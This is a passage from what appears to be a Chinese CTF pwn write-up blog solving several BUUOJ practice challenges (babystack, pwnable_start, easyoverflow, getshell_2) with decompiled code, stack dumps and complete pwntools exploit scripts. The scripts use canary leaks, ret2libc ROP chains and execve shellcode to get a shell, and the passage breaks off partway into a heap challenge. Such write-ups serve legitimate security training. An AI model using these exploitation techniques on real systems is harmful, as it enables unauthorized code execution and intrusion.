class="string">&#x27;/home/gwt/Desktop/babystack&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>main：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = input();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:                                   <span class="comment">// print</span></span><br><span class="line">        <span class="built_in">puts</span>(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// store</span></span><br><span class="line">        read(<span class="number">0</span>, s, <span class="number">0x100</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        puts_(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    puts_(&amp;unk_400AE7);<span class="comment">//换行</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>store的read函数有溢出</p><p><code>payload = &#39;a&#39;*(0x90-8)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 32</span></span><br><span class="line">00:0000│ rsp  0x7fffffffdde8 —▸ 0x400884 ◂— 0x7f00cc7d83cc4589</span><br><span class="line">01:0008│      0x7fffffffddf0 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffddf8 —▸ 0x7fffffffde20 —▸ 0x7fffffffde30 —▸ 0x7fffffffdee0 —▸ 0x400a30 ◂— ...</span><br><span class="line">03:0018│ rsi  0x7fffffffde00 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7fffffffde20 —▸ 0x7fffffffde30 —▸ 0x7fffffffdee0 —▸ 0x400a30 ◂— 0x41ff894156415741</span><br><span class="line">08:0040│      0x7fffffffde28 ◂— 0x10cdd61fbdf3e300</span><br><span class="line">09:0048│ rbp  0x7fffffffde30 —▸ 0x7fffffffdee0 —▸ 0x400a30 ◂— 0x41ff894156415741</span><br><span class="line">0a:0050│      0x7fffffffde38 —▸ 0x4009a9 ◂— 0x858bffffff6c8589</span><br><span class="line">0b:0058│      0x7fffffffde40 ◂— 0x0</span><br><span class="line">0c:0060│      0x7fffffffde48 ◂— 0x200000000</span><br><span class="line">0d:0068│      0x7fffffffde50 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">1e:00f0│      0x7fffffffded8 ◂— 0x10cdd61fbdf3e300 &lt;= 这里就是canary</span><br><span class="line">1f:00f8│      0x7fffffffdee0 —▸ 0x400a30 ◂— 0x41ff894156415741</span><br></pre></td></tr></table></figure><p>大致思路就是，先leak canary，然后是libcbase，再之后写system(/bin/sh)就OK</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./babystack&quot;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27068</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0400a93</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">choice</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">content</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>)</span><br><span class="line">write(payload)</span><br><span class="line">dump()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;canary: &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>) +p64(canary) +<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi)</span><br><span class="line">payload +=p64(puts_got)+p64(puts_plt)+ p64(main_addr)</span><br><span class="line"></span><br><span class="line">write(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr: &#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>) +p64(canary) +<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh) +p64(sys_add)</span><br><span class="line"></span><br><span class="line">write(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x36-pwnable-start"><a href="#0x36-pwnable-start" class="headerlink" title="0x36.pwnable_start"></a>0x36.pwnable_start</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec start </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/start&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure><p>进去的栈布局是这样的:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ ecx esp  0xffffd134 ◂— 0x2774654c (&quot;Let&#x27;&quot;)</span><br><span class="line">01:0004│          0xffffd138 ◂— 0x74732073 (&#x27;s st&#x27;)</span><br><span class="line">02:0008│          0xffffd13c ◂— 0x20747261 (&#x27;art &#x27;)</span><br><span class="line">03:000c│          0xffffd140 ◂— 0x20656874 (&#x27;the &#x27;)</span><br><span class="line">04:0010│          0xffffd144 ◂— 0x3a465443 (&#x27;CTF:&#x27;)</span><br><span class="line">05:0014│          0xffffd148 —▸ 0x804809d (_exit) ◂— pop    esp</span><br><span class="line">06:0018│          0xffffd14c —▸ 0xffffd150 ◂— 0x1</span><br><span class="line">07:001c│          0xffffd150 ◂— 0x1</span><br></pre></td></tr></table></figure><p>它系统调用的时候，sys_write(fd,len==0x14,addr==esp)，而esp就是0xffffd134这里。</p><p>程序在一开始的时候push了_exit进去，也就是退出程序。</p><p>构造<code>payload = &#39;a&#39;*0x14+ p32(0x08048087)</code></p><p>之后会sys_read，其中ebx=0,ecx=esp,edx=0x3c，且最后会add esp,14h.</p><p>构造：<code>payload = &#39;a&#39;*0x14+ p32(addr + 0x14) + shellcode</code></p><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./start&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25817</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+ p32(<span class="number">0x08048087</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&#x27;addr:&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+ p32(addr + <span class="number">0x14</span>)+ shellcode</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x37-mrctf2020-easyoverflow"><a href="#0x37-mrctf2020-easyoverflow" class="headerlink" title="0x37.mrctf2020_easyoverflow"></a>0x37.mrctf2020_easyoverflow</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec mrctf2020_easyoverflow </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/mrctf2020_easyoverflow&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> a1[<span class="number">64</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;a1[<span class="number">56</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(a1, <span class="string">&quot;ju3t_@_f@k3_f1@g&quot;</span>);</span><br><span class="line">  *&amp;a1[<span class="number">24</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;a1[<span class="number">32</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;a1[<span class="number">40</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;a1[<span class="number">48</span>] = <span class="number">0</span>;</span><br><span class="line">  gets(v4, argv);</span><br><span class="line">  <span class="keyword">if</span> ( !check(a1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(fake_flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == v3 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != fake_flag[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./mrctf2020_easyoverflow&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26267</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + <span class="string">&#x27;n0t_r3@11y_f1@g&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x38-wustctf2020-getshell-2"><a href="#0x38-wustctf2020-getshell-2" class="headerlink" title="0x38.wustctf2020_getshell_2"></a>0x38.wustctf2020_getshell_2</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec wustctf2020_getshell_2 </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/wustctf2020_getshell_2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x24</span>u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ROPgadget --binary wustctf2020_getshell_2  --string <span class="string">&quot;sh&quot;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048670 : sh</span><br></pre></td></tr></table></figure><p>有system，有sh.</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./wustctf2020_getshell_2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28068</span>)</span><br><span class="line">io.recv()</span><br><span class="line">call_sys = <span class="number">0x08048529</span></span><br><span class="line">sh_add  = <span class="number">0x08048670</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(call_sys)+p32(sh_add)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x39-hitcontraining-magicheap"><a href="#0x39-hitcontraining-magicheap" class="headerlink" title="0x39.hitcontraining_magicheap"></a>0x39.hitcontraining_magicheap</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span 